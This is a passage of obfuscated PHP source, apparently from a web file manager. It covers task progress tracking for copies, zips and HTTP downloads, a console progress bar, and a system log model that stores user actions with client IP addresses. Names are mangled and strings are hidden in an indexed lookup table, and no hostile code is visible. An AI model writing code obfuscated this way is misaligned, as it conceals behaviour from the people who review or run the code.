$­Î›´»÷[1765]); } $this->update(0, $´ºœÄõ¸); } public static function updateCopyLocalFileSize($Ğì¿˜Òã) { $Ä™„¯ïÇ =& $_SERVER[èùÙ¹Ïö]; $¢ªâ°²º = Cache::get($Ğì¿˜Òã[$Ä™„¯ïÇ[445]] . $Ä™„¯ïÇ[1763]); if (!$¢ªâ°²º || !file_exists($¢ªâ°²º)) { return $Ğì¿˜Òã; } $Ğì¿˜Òã[$Ä™„¯ïÇ[1750]] = @filesize($¢ªâ°²º); $Ğì¿˜Òã[$Ä™„¯ïÇ[1754]] += $Ğì¿˜Òã[$Ä™„¯ïÇ[1750]]; self::updateTask($Ğì¿˜Òã); return $Ğì¿˜Òã; } public function copyFileEnd($ù°¬“Šå, $öø”ß‚­, $°âÀÊ‡«, $ä†‡¦ÎØ, $òüš•ÚÊ, $éˆÇúÂ²) { $­€¢Ù =& $_SERVER[èùÙ¹Ïö]; $óä»°¶ñ =& $this->task; $óä»°¶ñ[$­€¢Ù[1750]] = $óä»°¶ñ[$­€¢Ù[1749]]; $óä»°¶ñ[$­€¢Ù[1751]] = $­€¢Ù[12]; unset($óä»°¶ñ[$­€¢Ù[1720]]); if ($òüš•ÚÊ == $óä»°¶ñ[$­€¢Ù[1747]]) { $óä»°¶ñ[$­€¢Ù[1753]] += $óä»°¶ñ[$­€¢Ù[1749]]; $óä»°¶ñ[$­€¢Ù[1754]] = $óä»°¶ñ[$­€¢Ù[1753]]; $é×ÉõŸì = 1; if (isset($óä»°¶ñ[$­€¢Ù[1760]]) && $óä»°¶ñ[$­€¢Ù[1760]] == $öø”ß‚­) { $é×ÉõŸì = 0; } $this->update($é×ÉõŸì); } else { $this->update(); $óä»°¶ñ[$­€¢Ù[1750]] = 0; } Cache::remove($óä»°¶ñ[$­€¢Ù[445]] . $­€¢Ù[1763]); self::log($­€¢Ù[1766] . $öø”ß‚­ . $­€¢Ù[72] . $ä†‡¦ÎØ . $­€¢Ù[248] . $òüš•ÚÊ . $­€¢Ù[1767] . $óä»°¶ñ[$­€¢Ù[1747]]); } public function updateFileEnd($÷–¦ŒÕ», $§ÃÍ—ßÀ) { $ĞûÂ‡¾İ =& $_SERVER[èùÙ¹Ïö]; $§öÖì =& $this->task; $§öÖì[$ĞûÂ‡¾İ[1747]] = $÷–¦ŒÕ»; $§öÖì[$ĞûÂ‡¾İ[1749]] = $§ÃÍ—ßÀ; $§öÖì[$ĞûÂ‡¾İ[1753]] += $§ÃÍ—ßÀ; $§öÖì[$ĞûÂ‡¾İ[1754]] = $§öÖì[$ĞûÂ‡¾İ[1753]]; $this->update(1); self::log($ĞûÂ‡¾İ[1768] . $÷–¦ŒÕ»); } public function sourceModelCopy($˜ĞûÆæ) { $ÀŸ‰üµÔ =& $_SERVER[èùÙ¹Ïö]; $†öÊı†€ = $˜ĞûÆæ[0]; $¿ô›…Ö = $˜ĞûÆæ[1]; $«â›ªƒ =& $this->task; $this->sourceModelCopyFlag = !0; $ø±º·ÎÅ = 0; switch ($†öÊı†€) { case $ÀŸ‰üµÔ[606]: $ø±º·ÎÅ = 1; break; case $ÀŸ‰üµÔ[609]: $«â›ªƒ[$ÀŸ‰üµÔ[1747]] = $¿ô›…Ö[$ÀŸ‰üµÔ[32]]; break; case $ÀŸ‰üµÔ[611]: $ø±º·ÎÅ = intval($˜ĞûÆæ[$ÀŸ‰üµÔ[426]] * 0.4); break; case $ÀŸ‰üµÔ[613]: $ø±º·ÎÅ = intval($˜ĞûÆæ[$ÀŸ‰üµÔ[426]] * 0.2); break; case $ÀŸ‰üµÔ[615]: $ø±º·ÎÅ = intval($˜ĞûÆæ[$ÀŸ‰üµÔ[426]] * 0.4); break; } $this->update($ø±º·ÎÅ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($Í»Óƒ°, $Şï¼ÙÈó) { $Ä•š™ó— =& $_SERVER[èùÙ¹Ïö]; $this->sourceModelCopyFlag = !0; $¶Ã¾ú¿ = 1; if (isset($Í»Óƒ°[$Ä•š™ó—[81]])) { $¶Ã¾ú¿ = $Í»Óƒ°[$Ä•š™ó—[81]][$Ä•š™ó—[79]]; $¶Ã¾ú¿ = $¶Ã¾ú¿ + $Í»Óƒ°[$Ä•š™ó—[81]][$Ä•š™ó—[80]] + 1; } $this->update($¶Ã¾ú¿); $this->sourceModelCopyFlag = !1; } public function sourceMove($­Ïã»¸÷) { $this->sourceRemove($­Ïã»¸÷, !1); } public function curlProgress($±ı’”ÕÊ, $¹·Î¹‚¢, $°„Éñğú, $êï¿î, $ıº¤á°ï) { $¥âÜëö± =& $_SERVER[èùÙ¹Ïö]; $â ÅÙ˜ =& $this->task; if ($ıº¤á°ï > 0) { $â ÅÙ˜[$¥âÜëö±[1110]] = $¥âÜëö±[1769]; $â ÅÙ˜[$¥âÜëö±[1751]] = $¥âÜëö±[109]; if ($â ÅÙ˜[$¥âÜëö±[1749]]) { $â ÅÙ˜[$¥âÜëö±[1750]] = $ıº¤á°ï; } if ($â ÅÙ˜[$¥âÜëö±[1752]]) { $â ÅÙ˜[$¥âÜëö±[1750]] = $ıº¤á°ï + $â ÅÙ˜[$¥âÜëö±[1752]]; } } else { if ($°„Éñğú > 0) { if ($â ÅÙ˜[$¥âÜëö±[1749]] == $¹·Î¹‚¢) { $â ÅÙ˜[$¥âÜëö±[1750]] = $°„Éñğú; $â ÅÙ˜[$¥âÜëö±[1110]] = $¥âÜëö±[1770]; $â ÅÙ˜[$¥âÜëö±[1751]] = $¥âÜëö±[1242]; } } } $this->update(); } public function curlProgressStart($äî’èÛÀ) { } public function curlProgressEnd($íÀ€¦äâ) { $—¶®ë¿í =& $_SERVER[èùÙ¹Ïö]; $ëøìçÌæ =& $this->task; $á‰ÄÍ¸ª = curl_getinfo($íÀ€¦äâ); $ùì¨ª†› = $á‰ÄÍ¸ª[$—¶®ë¿í[1771]]; if ($ùì¨ª†› == -1) { $ùì¨ª†› = $á‰ÄÍ¸ª[$—¶®ë¿í[1772]]; } if ($ëøìçÌæ[$—¶®ë¿í[1751]] == $—¶®ë¿í[109] && $ùì¨ª†›) { $ëøìçÌæ[$—¶®ë¿í[1752]] += $ùì¨ª†›; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ÛƒØ½½ =& $_SERVER[èùÙ¹Ïö]; $»…ğèé÷ =& $this->task; $»…ğèé÷[$ÛƒØ½½[1773]] = 1; Hook::bind($ÛƒØ½½[1741], array($this, $ÛƒØ½½[1774])); Hook::bind($ÛƒØ½½[1743], array($this, $ÛƒØ½½[1775])); Hook::bind($ÛƒØ½½[1745], array($this, $ÛƒØ½½[1776])); } protected function endAfter() { $•ô–È¬² =& $_SERVER[èùÙ¹Ïö]; Hook::unbind($•ô–È¬²[1741], array($this, $•ô–È¬²[1774])); Hook::unbind($•ô–È¬²[1743], array($this, $•ô–È¬²[1775])); Hook::unbind($•ô–È¬²[1745], array($this, $•ô–È¬²[1776])); } public function progressStart($åµ‡à¢) { $¯É¶»›Á =& $_SERVER[èùÙ¹Ïö]; $¨µïôç = curl_getinfo($åµ‡à¢); self::log($¯É¶»›Á[1777] . $¨µïôç[$¯É¶»›Á[353]]); self::valueSet($this->task[$¯É¶»›Á[445]], $this->task); } public function progressEnd($×Œ°ĞÙì) { $ÛåŒ²Û =& $_SERVER[èùÙ¹Ïö]; self::log($ÛåŒ²Û[1778] . $this->task[$ÛåŒ²Û[445]]); $this->end(); } public function progress($ñ´æˆ, $—›Ë¹İ·, $˜Ë÷òÒş, $ğ¶Í™Ï, $à¦üÇ•) { $Ğ½˜ù‘ú =& $_SERVER[èùÙ¹Ïö]; $Ÿ›ˆ¯¶ =& $this->task; if ($à¦üÇ• > 0) { $Ÿ›ˆ¯¶[$Ğ½˜ù‘ú[826]] = $Ÿ›ˆ¯¶[$Ğ½˜ù‘ú[826]] == 0 ? $ğ¶Í™Ï : $Ÿ›ˆ¯¶[$Ğ½˜ù‘ú[826]]; $Ÿ›ˆ¯¶[$Ğ½˜ù‘ú[1697]] = $à¦üÇ•; } else { if ($˜Ë÷òÒş > 0) { $Ÿ›ˆ¯¶[$Ğ½˜ù‘ú[826]] = $Ÿ›ˆ¯¶[$Ğ½˜ù‘ú[826]] == 0 ? $—›Ë¹İ· : $Ÿ›ˆ¯¶[$Ğ½˜ù‘ú[826]]; $Ÿ›ˆ¯¶[$Ğ½˜ù‘ú[1697]] = $˜Ë÷òÒş; } } $this->update(); self::log("\x70\x72\157\147\162\145\163\163\x48\164\164\160\x3a\144\x6f\x77\156\72{$˜Ë÷òÒş}\x2f{$—›Ë¹İ·}\73\40\x75\x70\x6c\x6f\141\x64\72{$à¦üÇ•}\57{$ğ¶Í™Ï}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($€¯“©», $îêÒø£ = '', $ş‚Ìá‹š = 0, $ıúÛÃÆŞ = '') { $ƒ„Ä£ü« =& $_SERVER[èùÙ¹Ïö]; $ıúÛÃÆŞ = $ıúÛÃÆŞ ? $ıúÛÃÆŞ : ($îêÒø£ ? $îêÒø£ : $€¯“©»); $¹¼Û¢Á” = new Task($€¯“©», $îêÒø£, $ş‚Ìá‹š, $ıúÛÃÆŞ); $GLOBALS[$ƒ„Ä£ü«[1779] . $€¯“©»] = new TaskLog($ƒ„Ä£ü«[1680], $¹¼Û¢Á”, $ıúÛÃÆŞ); return $¹¼Û¢Á”; } public function __construct($ïÛ ¥ş¼ = '', $ûÓ±©äÒ = '', $‘´Ä™ûï = '') { $ö„¶®¡Ş =& $_SERVER[èùÙ¹Ïö]; if (!$ïÛ ¥ş¼) { $ïÛ ¥ş¼ = $ö„¶®¡Ş[1680]; } $ç­Ûşç² = $ïÛ ¥ş¼ . $ö„¶®¡Ş[432] . rand_string(10); if (!$‘´Ä™ûï) { $‘´Ä™ûï = $ïÛ ¥ş¼ . $ö„¶®¡Ş[53] . $‘´Ä™ûï; } switch ($ïÛ ¥ş¼) { case $ö„¶®¡Ş[1680]: if (!$ûÓ±©äÒ || !$ûÓ±©äÒ->task) { return echoLog($ïÛ ¥ş¼ . $ö„¶®¡Ş[1780]); } $—ßá¤½ø = $ûÓ±©äÒ; $ç­Ûşç² = $—ßá¤½ø->task[$ö„¶®¡Ş[445]]; $ïÛ ¥ş¼ = $—ßá¤½ø->task[$ö„¶®¡Ş[445]]; if (!$—ßá¤½ø->task[$ö„¶®¡Ş[1592]]) { $—ßá¤½ø->task[$ö„¶®¡Ş[1592]] = $‘´Ä™ûï ? $‘´Ä™ûï : $ïÛ ¥ş¼; } break; case $ö„¶®¡Ş[1781]: if (!$ûÓ±©äÒ) { return echoLog($ïÛ ¥ş¼ . $ö„¶®¡Ş[1782]); } $Š¾ÆËªß = is_string($ûÓ±©äÒ) ? array($ûÓ±©äÒ) : $ûÓ±©äÒ; $—ßá¤½ø = new TaskFileTransfer($ç­Ûşç², $ïÛ ¥ş¼, 0, $‘´Ä™ûï ? $‘´Ä™ûï : $Š¾ÆËªß[0]); foreach ($Š¾ÆËªß as $Ã¼ñøË) { $—ßá¤½ø->addPath($Ã¼ñøË); } break; case $ö„¶®¡Ş[359]: if (!$ûÓ±©äÒ) { return echoLog($ïÛ ¥ş¼ . $ö„¶®¡Ş[1782]); } $Š¾ÆËªß = is_string($ûÓ±©äÒ) ? array($ûÓ±©äÒ) : $ûÓ±©äÒ; $—ßá¤½ø = new TaskZip($ç­Ûşç², $ïÛ ¥ş¼, 0, $‘´Ä™ûï ? $‘´Ä™ûï : $Š¾ÆËªß[0]); foreach ($Š¾ÆËªß as $Ã¼ñøË) { $—ßá¤½ø->addPath($Ã¼ñøË); } break; case $ö„¶®¡Ş[1262]: if (!$ûÓ±©äÒ) { return echoLog($ïÛ ¥ş¼ . $ö„¶®¡Ş[1782]); } $—ßá¤½ø = new TaskUnZip($ç­Ûşç², $ïÛ ¥ş¼, 0, $‘´Ä™ûï ? $‘´Ä™ûï : $ûÓ±©äÒ); if ($ûÓ±©äÒ) { $—ßá¤½ø->addFile($ûÓ±©äÒ); } break; case $ö„¶®¡Ş[151]: $—ßá¤½ø = new TaskHttp($ç­Ûşç², $ïÛ ¥ş¼); break; default: return; break; } $this->task = $—ßá¤½ø; $this->taskID = $ç­Ûşç²; Hook::bind($ö„¶®¡Ş[1717], array($this, $ö„¶®¡Ş[1783])); Hook::bind($ö„¶®¡Ş[1719], array($this, $ö„¶®¡Ş[1784])); Hook::bind($ö„¶®¡Ş[1713], array($this, $ö„¶®¡Ş[1785])); echoLog($ö„¶®¡Ş[1786] . $—ßá¤½ø->task[$ö„¶®¡Ş[1592]]); } public function __destruct() { $this->end(); } public function end($ÑµôÅŞ— = '') { $„šûóÄÔ =& $_SERVER[èùÙ¹Ïö]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ÑµôÅŞ—); $this->task = !1; $this->taskID = !1; Hook::unbind($„šûóÄÔ[1717], array($this, $„šûóÄÔ[1783])); Hook::unbind($„šûóÄÔ[1719], array($this, $„šûóÄÔ[1784])); Hook::unbind($„šûóÄÔ[1713], array($this, $„šûóÄÔ[1785])); } public function taskUpdate($„­òéÙÒ) { $¢¼µôÏâ =& $_SERVER[èùÙ¹Ïö]; if (!$„­òéÙÒ || $this->taskID != $„­òéÙÒ[$¢¼µôÏâ[445]]) { return; } $ƒÈ­åóÍ = 20; $¦“ÄÌ«Ø = intval($„­òéÙÒ[$¢¼µôÏâ[1698]] * $ƒÈ­åóÍ); $¥›‰ô£à = $¢¼µôÏâ[165] . str_repeat($¢¼µôÏâ[930], $¦“ÄÌ«Ø) . $¢¼µôÏâ[1060] . str_repeat($¢¼µôÏâ[53], $ƒÈ­åóÍ - $¦“ÄÌ«Ø) . $¢¼µôÏâ[167]; $áşƒŞ×ß = $¥›‰ô£à . sprintf($¢¼µôÏâ[1787], $„­òéÙÒ[$¢¼µôÏâ[1698]] * 100) . $¢¼µôÏâ[1788]; $¤óò¹³á = $áşƒŞ×ß . $„­òéÙÒ[$¢¼µôÏâ[1697]] . $¢¼µôÏâ[8] . $„­òéÙÒ[$¢¼µôÏâ[826]] . LNG($¢¼µôÏâ[1789]); $¸öƒïÛŠ = $¢¼µôÏâ[12]; if ($„­òéÙÒ[$¢¼µôÏâ[1773]]) { $¤óò¹³á = $áşƒŞ×ß . size_format($„­òéÙÒ[$¢¼µôÏâ[1697]]) . $¢¼µôÏâ[8] . size_format($„­òéÙÒ[$¢¼µôÏâ[826]]); $¸öƒïÛŠ = size_format($„­òéÙÒ[$¢¼µôÏâ[1699]]) . $¢¼µôÏâ[1790]; } if ($„­òéÙÒ[$¢¼µôÏâ[1110]]) { $„­òéÙÒ[$¢¼µôÏâ[1747]] = $„­òéÙÒ[$¢¼µôÏâ[1110]] . $¢¼µôÏâ[53] . $„­òéÙÒ[$¢¼µôÏâ[1747]]; } if ($„­òéÙÒ[$¢¼µôÏâ[1747]]) { $øÃÅ¹‹ª = $¢¼µôÏâ[12]; if ($„­òéÙÒ[$¢¼µôÏâ[1749]]) { $øÃÅ¹‹ª = $¢¼µôÏâ[50] . size_format($„­òéÙÒ[$¢¼µôÏâ[1750]]) . $¢¼µôÏâ[8] . size_format($„­òéÙÒ[$¢¼µôÏâ[1749]]); } $¸öƒïÛŠ .= $„­òéÙÒ[$¢¼µôÏâ[1747]] . $øÃÅ¹‹ª; } if ($„­òéÙÒ[$¢¼µôÏâ[803]] && !$„­òéÙÒ[$¢¼µôÏâ[1749]]) { $¸öƒïÛŠ .= $¢¼µôÏâ[53] . size_format($„­òéÙÒ[$¢¼µôÏâ[1754]]) . $¢¼µôÏâ[8] . size_format($„­òéÙÒ[$¢¼µôÏâ[803]]); } echoLog($¤óò¹³á . $¢¼µôÏâ[53] . $¸öƒïÛŠ, !0); } public function taskEnd($¥ä÷Î‰) { $ÂŠïƒİÑ =& $_SERVER[èùÙ¹Ïö]; if (!$¥ä÷Î‰ || $this->taskID != $¥ä÷Î‰[$ÂŠïƒİÑ[445]]) { return; } $ù½úÌæ = $¥ä÷Î‰ ? $¥ä÷Î‰[$ÂŠïƒİÑ[1697]] . $ÂŠïƒİÑ[8] . $¥ä÷Î‰[$ÂŠïƒİÑ[826]] . LNG($ÂŠïƒİÑ[1789]) . $ÂŠïƒİÑ[73] : $ÂŠïƒİÑ[12]; echoLog($ÂŠïƒİÑ[1791] . $¥ä÷Î‰[$ÂŠïƒİÑ[1592]] . ($¥ä÷Î‰[$ÂŠïƒİÑ[496]] ? $ÂŠïƒİÑ[73] . $¥ä÷Î‰[$ÂŠïƒİÑ[496]] : $ÂŠïƒİÑ[12]) . $ÂŠïƒİÑ[73] . $ù½úÌæ . $ÂŠïƒİÑ[1792] . sprintf($ÂŠïƒİÑ[891], timeFloat() - $¥ä÷Î‰[$ÂŠïƒİÑ[1700]]) . $ÂŠïƒİÑ[1712]); $this->end(); } public function taskKill($¢ºËÉ¢Ş) { $äñøà³Á =& $_SERVER[èùÙ¹Ïö]; if (!$¢ºËÉ¢Ş || $this->taskID != $¢ºËÉ¢Ş[$äñøà³Á[445]]) { return; } echoLog($äñøà³Á[1793] . $¢ºËÉ¢Ş[$äñøà³Á[1592]]); } } goto FÕ–Ô’ç¦; AßŠ¾ÄğÎ: define($_SERVER[èùÙ¹Ïö][284], 1); define($_SERVER[èùÙ¹Ïö][285], 2); define($_SERVER[èùÙ¹Ïö][286], 3); goto cÒæÍ™Ï; cŸé„åŞØ: class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\x65\155\137\x6c\x6f\x67"; protected $dataAuto = array(array("\143\x72\x65\141\x74\x65\124\x69\x6d\145", "\x74\x69\155\x65", "\x69\x6e\163\x65\162\164", "\x66\x75\x6e\143\164\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $¯æŞœ‹ƒ =& $_SERVER[èùÙ¹Ïö]; return array($¯æŞœ‹ƒ[2231] => LNG($¯æŞœ‹ƒ[2232]), $¯æŞœ‹ƒ[2233] => LNG($¯æŞœ‹ƒ[2234]), $¯æŞœ‹ƒ[1837] => LNG($¯æŞœ‹ƒ[2235]), $¯æŞœ‹ƒ[2236] => LNG($¯æŞœ‹ƒ[2237]), $¯æŞœ‹ƒ[2238] => LNG($¯æŞœ‹ƒ[2239]), $¯æŞœ‹ƒ[2240] => LNG($¯æŞœ‹ƒ[2241]), $¯æŞœ‹ƒ[2242] => LNG($¯æŞœ‹ƒ[2243]), $¯æŞœ‹ƒ[1867] => LNG($¯æŞœ‹ƒ[2243]), $¯æŞœ‹ƒ[1868] => LNG($¯æŞœ‹ƒ[2244]), $¯æŞœ‹ƒ[2245] => LNG($¯æŞœ‹ƒ[2246]), $¯æŞœ‹ƒ[2247] => LNG($¯æŞœ‹ƒ[2248]), $¯æŞœ‹ƒ[2249] => LNG($¯æŞœ‹ƒ[2250]), $¯æŞœ‹ƒ[2251] => LNG($¯æŞœ‹ƒ[2252]), $¯æŞœ‹ƒ[1865] => LNG($¯æŞœ‹ƒ[2253]), $¯æŞœ‹ƒ[2254] => LNG($¯æŞœ‹ƒ[2255]), $¯æŞœ‹ƒ[1872] => LNG($¯æŞœ‹ƒ[2256]), $¯æŞœ‹ƒ[2257] => LNG($¯æŞœ‹ƒ[2258]), $¯æŞœ‹ƒ[2259] => LNG($¯æŞœ‹ƒ[2260]), $¯æŞœ‹ƒ[2261] => LNG($¯æŞœ‹ƒ[2262]), $¯æŞœ‹ƒ[2263] => LNG($¯æŞœ‹ƒ[2264]), $¯æŞœ‹ƒ[1875] => LNG($¯æŞœ‹ƒ[2265]), $¯æŞœ‹ƒ[1876] => LNG($¯æŞœ‹ƒ[2266]), $¯æŞœ‹ƒ[2267] => LNG($¯æŞœ‹ƒ[2268]), $¯æŞœ‹ƒ[2269] => LNG($¯æŞœ‹ƒ[2270]), $¯æŞœ‹ƒ[2271] => LNG($¯æŞœ‹ƒ[2272]), $¯æŞœ‹ƒ[1870] => LNG($¯æŞœ‹ƒ[2273]), $¯æŞœ‹ƒ[2274] => LNG($¯æŞœ‹ƒ[2275]), $¯æŞœ‹ƒ[1869] => LNG($¯æŞœ‹ƒ[2276]), $¯æŞœ‹ƒ[2277] => LNG($¯æŞœ‹ƒ[2278]), $¯æŞœ‹ƒ[2279] => LNG($¯æŞœ‹ƒ[2280]), $¯æŞœ‹ƒ[2281] => LNG($¯æŞœ‹ƒ[2282]), $¯æŞœ‹ƒ[2283] => LNG($¯æŞœ‹ƒ[2283]), $¯æŞœ‹ƒ[2284] => LNG($¯æŞœ‹ƒ[1841]), $¯æŞœ‹ƒ[2285] => LNG($¯æŞœ‹ƒ[2286]), $¯æŞœ‹ƒ[2287] => LNG($¯æŞœ‹ƒ[2288]), $¯æŞœ‹ƒ[2289] => LNG($¯æŞœ‹ƒ[2290]), $¯æŞœ‹ƒ[2291] => LNG($¯æŞœ‹ƒ[2292]), $¯æŞœ‹ƒ[2293] => LNG($¯æŞœ‹ƒ[2294]), $¯æŞœ‹ƒ[2295] => LNG($¯æŞœ‹ƒ[2295]), $¯æŞœ‹ƒ[2296] => LNG($¯æŞœ‹ƒ[2297]), $¯æŞœ‹ƒ[2298] => LNG($¯æŞœ‹ƒ[2299]), $¯æŞœ‹ƒ[2300] => LNG($¯æŞœ‹ƒ[2301]), $¯æŞœ‹ƒ[2302] => LNG($¯æŞœ‹ƒ[2303]), $¯æŞœ‹ƒ[2304] => LNG($¯æŞœ‹ƒ[2305]), $¯æŞœ‹ƒ[2306] => LNG($¯æŞœ‹ƒ[2307])); } private function typeFile() { $•ÍøñÈë =& $_SERVER[èùÙ¹Ïö]; $šŠ·”¿ê = array($•ÍøñÈë[1872] => array($•ÍøñÈë[1873]), $•ÍøñÈë[2249] => array($•ÍøñÈë[2308]), $•ÍøñÈë[2251] => array($•ÍøñÈë[2309]), $•ÍøñÈë[1865] => array($•ÍøñÈë[1866], $•ÍøñÈë[2310]), $•ÍøñÈë[2259] => array(), $•ÍøñÈë[2261] => array(), $•ÍøñÈë[2263] => array(), $•ÍøñÈë[1875] => array($•ÍøñÈë[1877]), $•ÍøñÈë[1876] => array($•ÍøñÈë[1877]), $•ÍøñÈë[2267] => array($•ÍøñÈë[2311]), $•ÍøñÈë[2269] => array($•ÍøñÈë[2311]), $•ÍøñÈë[2271] => array($•ÍøñÈë[2312]), $•ÍøñÈë[2257] => array($•ÍøñÈë[2313]), $•ÍøñÈë[1870] => array($•ÍøñÈë[2314]), $•ÍøñÈë[2274] => array($•ÍøñÈë[2315]), $•ÍøñÈë[1869] => array($•ÍøñÈë[1871])); return $šŠ·”¿ê; } private function typeAll() { $„“—€£« =& $_SERVER[èùÙ¹Ïö]; $¼çøî°Í = $this->typeList; $–àÜâË = array_filter($this->typeFile()); foreach ($–àÜâË as $Í¸¯µø => $Ø©±Îµ) { $¼çøî°Í[$Ø©±Îµ[0]] = $¼çøî°Í[$Í¸¯µø]; } $¼çøî°Í[$„“—€£«[1877]] = LNG($„“—€£«[2316]); $¼çøî°Í[$„“—€£«[2311]] = LNG($„“—€£«[2317]); return $¼çøî°Í; } public function addLog($Ï„§Ôª, $ ÷ƒ®´ = array()) { $…†åî =& $_SERVER[èùÙ¹Ïö]; if (!isset($this->typeList[$Ï„§Ôª])) { return; } $¶×°¿›ò = isset($ ÷ƒ®´[$…†åî[1696]]) ? $ ÷ƒ®´[$…†åî[1696]] : 0; if (!$¶×°¿›ò) { $¶×°¿›ò = Session::get($…†åî[2032]); } if ($Ï„§Ôª == $…†åî[2285] && is_array($ ÷ƒ®´[$…†åî[2318]]) && !$ ÷ƒ®´[$…†åî[2318]]) { return; } $¹×ƒ†Å» = get_client_ip(); if (!$ ÷ƒ®´ || strlen(json_encode($ ÷ƒ®´)) >= 1024) { $ ÷ƒ®´ = array($…†åî[2319] => $¹×ƒ†Å»); } else { if (is_array($ ÷ƒ®´)) { $ ÷ƒ®´[$…†åî[2319]] = $¹×ƒ†Å»; } else { $ ÷ƒ®´ = array($…†åî[1250] => $ ÷ƒ®´, $…†åî[2319] => $¹×ƒ†Å»); } } $ ÷ƒ®´ = array($…†åî[1686] => Session::sign(), $…†åî[1687] => intval($¶×°¿›ò), $…†åî[33] => $Ï„§Ôª, $…†åî[1689] => json_encode($ ÷ƒ®´)); parent::add($ ÷ƒ®´); } public function remove($¸øº€¡×) { $this->where(array($_SERVER[èùÙ¹Ïö][463] => $¸øº€¡×))->delete(); } private function _makeOrder($¸”îÏğ = '') { $˜æŞô«× =& $_SERVER[èùÙ¹Ïö]; $ŞËûÑ = $˜æŞô«×[217]; $¸æêúìÕ = array($˜æŞô«×[493] => $˜æŞô«×[494], $˜æŞô«×[495] => $˜æŞô«×[496]); $°ü¨¸šæ = Input::get($˜æŞô«×[501], $˜æŞô«×[7], $˜æŞô«×[2068], array($˜æŞô«×[1985], $˜æŞô«×[495])); $°ü¨¸šæ = $¸æêúìÕ[$°ü¨¸šæ]; $¸”îÏğ = $¸”îÏğ . "{$ŞËûÑ}\x20{$°ü¨¸šæ}"; return $this->order($¸”îÏğ); } public function get($º¶­š = '') { $¶Ş±ø =& $_SERVER[èùÙ¹Ïö]; if (!$º¶­š) { show_json(array()); } $Á•ó“Ïà = array(); if ($º¶­š[$¶Ş±ø[1696]]) { $Á•ó“Ïà[$¶Ş±ø[1696]] = $º¶­š[$¶Ş±ø[1696]]; } if (isset($º¶­š[$¶Ş±ø[800]])) { $äÊõáé¿ = $º¶­š[$¶Ş±ø[800]]; $Óã©Œ“ = isset($º¶­š[$¶Ş±ø[801]]) ? $º¶­š[$¶Ş±ø[801]] : time(); $Á•ó“Ïà[$¶Ş±ø[217]] = array($¶Ş±ø[379], array($äÊõáé¿, $Óã©Œ“)); } if ($º¶­š[$¶Ş±ø[33]]) { $÷¹¹Êò = explode($¶Ş±ø[50], $º¶­š[$¶Ş±ø[33]]); $’—Ğ¹ = $this->typeFile(); $‡¾“‹„· = array(); foreach ($÷¹¹Êò as $úÇéµšó) { $‡¾“‹„·[] = $úÇéµšó; if (isset($’—Ğ¹[$úÇéµšó])) { $‡¾“‹„· = array_merge($‡¾“‹„·, $’—Ğ¹[$úÇéµšó]); } } $‡¾“‹„· = array_unique($‡¾“‹„·); if ($‡¾“‹„·) { $Á•ó“Ïà[$¶Ş±ø[33]] = array($¶Ş±ø[7], $‡¾“‹„·); } } else { $Á•ó“Ïà[$¶Ş±ø[33]] = array($¶Ş±ø[2320], $¶Ş±ø[2321]); } if (!empty($º¶­š[$¶Ş±ø[2319]])) { $Á•ó“Ïà[$¶Ş±ø[496]] = array($¶Ş±ø[429], "\45{$º¶­š[$¶Ş±ø[2319]]}\x25"); } $Ç¦‡÷Áå = $this->_makeOrder()->where($Á•ó“Ïà)->selectPage(); if (empty($Ç¦‡÷Áå[$¶Ş±ø[415]])) { show_json(array(), !0, $Ç¦‡÷Áå[$¶Ş±ø[412]]); } $Ç¦‡÷Áå[$¶Ş±ø[415]] = $this->logList($Ç¦‡÷Áå[$¶Ş±ø[415]]); return $Ç¦‡÷Áå; } private function ipAddress(&$ßİ…ù¸) { $å”¬Ğ =& $_SERVER[èùÙ¹Ïö]; if (!empty($ßİ…ù¸[$å”¬Ğ[2319]])) { $’‹€›Ãé = IpLocation::get($ßİ…ù¸[$å”¬Ğ[2319]]); } else { $’‹€›Ãé = LNG($å”¬Ğ[2322]); } $ßİ…ù¸[$å”¬Ğ[2323]] = $’‹€›Ãé; } private function descZipDownload($ÁÜâºâÒ, &$ôéÚüÆ) { $Â¦¤ò›º =& $_SERVER[èùÙ¹Ïö]; if (!isset($ÁÜâºâÒ[$Â¦¤ò›º[2324]])) { return; } $ŠÏ¨Ù£– = json_decode($ÁÜâºâÒ[$Â¦¤ò›º[2324]], !0); foreach ($ŠÏ¨Ù£– as $ËßÀ•æ‘) { try { $ïù©Æıî = IO::infoFullSimple($ËßÀ•æ‘[$Â¦¤ò›º[86]]); } catch (Exception $øÓ“š‹Ã) { continue; } $ÁÜâºâÒ[$Â¦¤ò›º[86]] = $ËßÀ•æ‘[$Â¦¤ò›º[86]]; $ôéÚüÆ[] = $ÁÜâºâÒ[$Â¦¤ò›º[183]] = $ïù©Æıî[$Â¦¤ò›º[183]]; $ôéÚüÆ[] = $ÁÜâºâÒ[$Â¦¤ò›º[2123]] = $ïù©Æıî[$Â¦¤ò›º[182]]; break; } return $ÁÜâºâÒ; } private function getSourceList(&$ãÔ ¯ïê) { $à§ì”É =& $_SERVER[èùÙ¹Ïö]; $¨éÂ“Œ÷ = array(); foreach ($ãÔ ¯ïê as $ûÅöœ—Œ => $–ş²Ï©°) { $ò™Æúµ£ = json_decode($–ş²Ï©°[$à§ì”É[496]], !0); if ($–ş²Ï©°[$à§ì”É[33]] == $à§ì”É[1868]) { $ò™Æúµ£ = $this->descZipDownload($ò™Æúµ£, $¨éÂ“Œ÷); $ãÔ ¯ïê[$ûÅöœ—Œ][$à§ì”É[496]] = json_encode($ò™Æúµ£); continue; } if (strpos($–ş²Ï©°[$à§ì”É[33]], $à§ì”É[2125]) !== 0) { if (!isset($ò™Æúµ£[$à§ì”É[86]]) || strpos($–ş²Ï©°[$à§ì”É[33]], $à§ì”É[2325]) !== 0) { continue; } try { $Ğæ½Àü± = IO::infoFullSimple($ò™Æúµ£[$à§ì”É[86]]); } catch (Exception $¯®ØÓ·¿) { continue; } $¨éÂ“Œ÷[] = $ò™Æúµ£[$à§ì”É[183]] = $Ğæ½Àü±[$à§ì”É[183]]; $¨éÂ“Œ÷[] = $ò™Æúµ£[$à§ì”É[2123]] = $Ğæ½Àü±[$à§ì”É[182]]; $ãÔ ¯ïê[$ûÅöœ—Œ][$à§ì”É[496]] = json_encode($ò™Æúµ£); 